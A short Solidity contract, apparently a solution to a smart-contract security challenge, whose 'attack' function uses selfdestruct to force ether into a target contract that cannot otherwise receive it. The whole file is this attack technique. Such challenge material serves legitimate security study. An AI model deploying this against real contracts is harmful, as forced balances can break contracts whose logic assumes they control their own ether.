// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

contract ForceTestDestruct {
    function attack(address _forceTest)
        external
        payable
    {
        selfdestruct(payable(_forceTest));
    }

}
